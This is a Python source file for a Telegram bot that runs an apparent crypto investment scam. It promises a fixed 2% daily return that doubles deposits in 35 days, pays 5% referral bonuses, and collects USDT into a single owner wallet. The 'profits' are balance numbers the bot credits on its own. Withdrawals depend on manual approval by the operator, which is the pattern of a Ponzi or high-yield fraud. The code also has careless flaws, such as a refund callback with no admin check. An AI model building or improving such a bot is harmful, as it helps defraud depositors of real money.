import asyncio, logging, os, json, requests, time
from threading import Thread
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_WALLET = "0x79f805319c0ff9b99eaf8a717110e468a496f9d8".lower()
ADMIN_ID = 7016458590
BSCSCAN_API = os.getenv("BSCSCAN_API", "")
USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955c".lower()

REFERRAL_PERCENT = 5
WITHDRAW_FEE = 1
MIN_WITHDRAW = 5
DAILY_RATE = 2

PLANS = {
    "plan_5": {"min": 5, "max_return": 10, "days": 35, "name": "💎 Plan $5 → $10"},
    "plan_10": {"min": 10, "max_return": 20, "days": 35, "name": "🚀 Plan $10 → $20"},
    "plan_15": {"min": 15, "max_return": 30, "days": 35, "name": "🔥 Plan $15 → $30"},
    "plan_20": {"min": 20, "max_return": 40, "days": 35, "name": "💰 Plan $20 → $40"},
    "plan_25": {"min": 25, "max_return": 50, "days": 35, "name": "👑 Plan $25 → $50"},
}

DB_FILE="users.json"
def load_db():
    try:
        with open(DB_FILE,"r") as f: return json.load(f)
    except: return {}
def save_db(d):
    with open(DB_FILE,"w") as f: json.dump(d,f)
users=load_db()
processed_tx=set()

app=Flask('')
@app.route('/')
def home(): return "V9 FINAL + ADMIN - LIVE"
def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT",10000)))
Thread(target=run_flask,daemon=True).start()

async def auto_check_deposits(app_bot):
    await asyncio.sleep(10)
    while True:
        if not BSCSCAN_API:
            await asyncio.sleep(60); continue
        try:
            url=f"https://api.bscscan.com/api?module=account&action=tokentx&contractaddress={USDT_CONTRACT}&address={OWNER_WALLET}&sort=desc&apikey={BSCSCAN_API}"
            r=requests.get(url,timeout=10).json()
            if r.get("status")=="1":
                for tx in r.get("result",[])[:30]:
                    h=tx["hash"]
                    if h in processed_tx: continue
                    if tx["to"].lower()!=OWNER_WALLET: continue
                    value=round(int(tx["value"])/(10**int(tx["tokenDecimal"])),2)
                    for uid,data in users.items():
                        if data.get("pending_deposit")==value and h not in data.get("txs",[]):
                            plan_key=None
                            for pk,pv in PLANS.items():
                                if pv["min"]==value: plan_key=pk; break
                            if not plan_key: continue
                            data.setdefault("txs",[]).append(h)
                            data["pending_deposit"]=None
                            inv={"amount":value,"plan":plan_key,"start":time.time(),"earned":0,"days_passed":0,"active":True}
                            data.setdefault("investments",[]).append(inv)
                            ref=data.get("ref_by")
                            if ref and ref in users:
                                bonus=round(value*REFERRAL_PERCENT/100,2)
                                users[ref]["balance"]=users[ref].get("balance",0)+bonus
                                try: await app_bot.bot.send_message(chat_id=int(ref), text=f"👥 Referral Bonus! +${bonus} (5%) from {uid} invested ${value}")
                                except: pass
                            save_db(users)
                            try: await app_bot.bot.send_message(chat_id=int(uid), text=f"✅ AUTO! ${value} Plan {PLANS[plan_key]['name']} Active! 2%/day = ${round(value*0.02,2)}/day\nTx: {h}")
                            except: pass
                            break
                    processed_tx.add(h)
        except Exception as e: print(e)
        await asyncio.sleep(60)

async def daily_profit_task(app_bot):
    await asyncio.sleep(20)
    while True:
        try:
            changed=False
            for uid,data in users.items():
                for inv in data.get("investments",[]):
                    if not inv.get("active"): continue
                    elapsed_days=int((time.time()-inv["start"])/86400)
                    if elapsed_days>inv.get("days_passed",0):
                        days_to_add=elapsed_days-inv.get("days_passed",0)
                        for _ in range(days_to_add):
                            if inv["days_passed"]>=35: inv["active"]=False; break
                            daily_profit=inv["amount"]*DAILY_RATE/100
                            inv["earned"]+=daily_profit
                            inv["days_passed"]+=1
                            data["balance"]=data.get("balance",0)+daily_profit
                            changed=True
                            if inv["earned"]+inv["amount"]>=PLANS[inv["plan"]]["max_return"]: inv["active"]=False
                            try: await app_bot.bot.send_message(chat_id=int(uid), text=f"💰 Daily +${round(daily_profit,2)} (2%) Day {inv['days_passed']}/35 Bal: ${round(data['balance'],2)}")
                            except: pass
            if changed: save_db(users)
        except: pass
        await asyncio.sleep(3600)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=str(update.effective_user.id)
    args=context.args
    if uid not in users:
        users[uid]={"balance":0,"pending_deposit":None,"txs":[],"investments":[],"ref_by":args[0] if args and args[0]!=uid else None}
        save_db(users)
    bal=round(users[uid].get("balance",0),2)
    txt=f"🔥 Magnet V9 FINAL\n\n💼 `{OWNER_WALLET}`\n💰 Bal: ${bal}\n\n📈 $5→$10 $10→$20 $15→$30 $20→$40 $25→$50\n2% Daily 35 Days\n✅ Deposit AUTO\n💸 Withdraw Manual 1%\n👥 Referral 5%"
    kb=[[InlineKeyboardButton("💰 Deposit AUTO",callback_data="deposit"),InlineKeyboardButton("💵 Balance",callback_data="balance")],
        [InlineKeyboardButton("📈 Plans",callback_data="plans")],
        [InlineKeyboardButton("💸 Withdraw",callback_data="withdraw"),InlineKeyboardButton("👥 Referral Link",callback_data="referral")],
        [InlineKeyboardButton("📊 My Investments",callback_data="myinv")]]
    await update.message.reply_text(txt,reply_markup=InlineKeyboardMarkup(kb),parse_mode="Markdown")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id!=ADMIN_ID: await update.message.reply_text("❌ Not admin"); return
    total_users=len(users)
    total_bal=sum([u.get("balance",0) for u in users.values()])
    total_inv=sum([sum([inv["amount"] for inv in u.get("investments",[])]) for u in users.values()])
    txt=f"👑 ADMIN PANEL\n\n👥 Users: {total_users}\n💰 Total Bal: ${round(total_bal,2)}\n📈 Invested: ${round(total_inv,2)}\n\n💼 Wallet:\n`{OWNER_WALLET}`\nBscScan: https://bscscan.com/address/{OWNER_WALLET}"
    kb=[[InlineKeyboardButton(f"👥 All Users ({total_users})",callback_data="admin_users")],[InlineKeyboardButton("📊 Stats",callback_data="admin_stats")]]
    await update.message.reply_text(txt,reply_markup=InlineKeyboardMarkup(kb),parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=str(q.from_user.id)
    if uid not in users: users[uid]={"balance":0,"pending_deposit":None,"txs":[],"investments":[],"ref_by":None}

    if q.data=="admin_users" and q.from_user.id==ADMIN_ID:
        txt=f"👥 ALL USERS ({len(users)}):\n\n"
        for i,(user_id,data) in enumerate(list(users.items())[:40],1):
            bal=round(data.get("balance",0),2); inv=len(data.get("investments",[])); ref=data.get("ref_by","None")
            txt+=f"{i}. {user_id} Bal:${bal} Inv:{inv} Ref:{ref}\n"
        await q.edit_message_text(txt,reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin",callback_data="admin_back")]])); return
    if q.data=="admin_back" and q.from_user.id==ADMIN_ID:
        total_users=len(users); total_bal=sum([u.get("balance",0) for u in users.values()])
        txt=f"👑 ADMIN Users:{total_users} Bal:${round(total_bal,2)}\n`{OWNER_WALLET}`"
        kb=[[InlineKeyboardButton(f"👥 All Users ({total_users})",callback_data="admin_users")]]
        await q.edit_message_text(txt,reply_markup=InlineKeyboardMarkup(kb),parse_mode="Markdown"); return

    if q.data=="deposit":
        await q.edit_message_text(f"SEND USDT BEP20 to:\n`{OWNER_WALLET}`\n\nSend $5 $10 $15 $20 $25 AUTO 60s!",parse_mode="Markdown")
    elif q.data=="plans":
        t="**5 PLANS 2% DAILY DOUBLE 35 DAYS**\n\n"; kb=[]
        for k,p in PLANS.items():
            t+=f"{p['name']} Daily ${p['min']*0.02}\n"
            kb.append([InlineKeyboardButton(p['name'],callback_data=k)])
        await q.edit_message_text(t,reply_markup=InlineKeyboardMarkup(kb),parse_mode="Markdown")
    elif q.data.startswith("plan_"):
        p=PLANS[q.data]; users[uid]["pending_deposit"]=p["min"]; save_db(users)
        await q.edit_message_text(f"Send ${p['min']} to:\n`{OWNER_WALLET}`\nAUTO 60s! Daily ${p['min']*0.02}",parse_mode="Markdown")
    elif q.data=="balance":
        await q.edit_message_text(f"Balance: ${round(users[uid].get('balance',0),2)}")
    elif q.data=="myinv":
        invs=users[uid].get("investments",[])
        if not invs: await q.edit_message_text("No investments")
        else:
            t="📊 Investments:\n\n"
            for inv in invs: t+=f"${inv['amount']} Earned ${round(inv['earned'],2)} Day {inv['days_passed']}/35 {'Active' if inv['active'] else 'Done'}\n"
            await q.edit_message_text(t)
    elif q.data=="withdraw":
        await q.edit_message_text(f"Withdraw Fee 1% Min ${MIN_WITHDRAW} Bal ${round(users[uid].get('balance',0),2)}\nSend amount e.g. 10"); context.user_data["awaiting"]="withdraw"
    elif q.data=="referral":
        link=f"https://t.me/{context.bot.username}?start={q.from_user.id}"
        refs=len([u for u in users.values() if u.get("ref_by")==uid])
        await q.edit_message_text(f"👥 Referral 5%\n\nYour link:\n{link}\n\nReferred: {refs} users\nEarns 5% AUTO!")
    elif q.data=="back":
        bal=round(users[uid].get("balance",0),2)
        await q.edit_message_text(f"Bal: ${bal} Wallet: `{OWNER_WALLET}`",parse_mode="Markdown")
    elif q.data.startswith("w_approve_"):
        _,_,tid,amt,rec=q.data.split("_"); await q.edit_message_text(f"✅ Approved {tid} ${rec} SEND NOW!")
        try: await context.bot.send_message(chat_id=int(tid), text=f"✅ Withdraw ${rec} Approved! Boss sent!")
        except: pass
    elif q.data.startswith("w_reject_"):
        _,_,tid,amt=q.data.split("_")
        if tid in users: users[tid]["balance"]+=float(amt); save_db(users)
        await q.edit_message_text(f"❌ Rejected {tid} Refunded")

async def msg_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=str(update.effective_user.id)
    if context.user_data.get("awaiting")=="withdraw":
        try:
            amt=float(update.message.text.strip())
            if amt<MIN_WITHDRAW: await update.message.reply_text(f"Min ${MIN_WITHDRAW}"); return
            if amt>users[uid].get("balance",0): await update.message.reply_text("Low balance"); return
            fee=round(amt*WITHDRAW_FEE/100,2); rec=round(amt-fee,2)
            users[uid]["balance"]-=amt; save_db(users)
            admin_msg=f"💸 WITHDRAW MANUAL\nUser:{uid} @{update.effective_user.username}\nAmt:${amt} Fee:${fee} Gets:${rec}\nSEND ${rec} MANUALLY!"
            kb=[[InlineKeyboardButton(f"✅ Sent ${rec}",callback_data=f"w_approve_{uid}_{amt}_{rec}"),InlineKeyboardButton("❌ Reject",callback_data=f"w_reject_{uid}_{amt}")]]
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=InlineKeyboardMarkup(kb))
            await update.message.reply_text(f"Request sent! You get ${rec} after Boss approval")
        except: await update.message.reply_text("Send number like 10")
        context.user_data["awaiting"]=None

async def run_bot():
    print("V9 FINAL ADMIN LIVE")
    app_bot=Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start",start))
    app_bot.add_handler(CommandHandler("admin",admin_panel))
    app_bot.add_handler(CallbackQueryHandler(button_handler))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg_handler))
    await app_bot.initialize(); await app_bot.start(); await app_bot.updater.start_polling()
    asyncio.create_task(auto_check_deposits(app_bot)); asyncio.create_task(daily_profit_task(app_bot))
    await asyncio.Event().wait()

if __name__=="__main__":
    logging.basicConfig(level=logging.INFO); asyncio.run(run_bot())
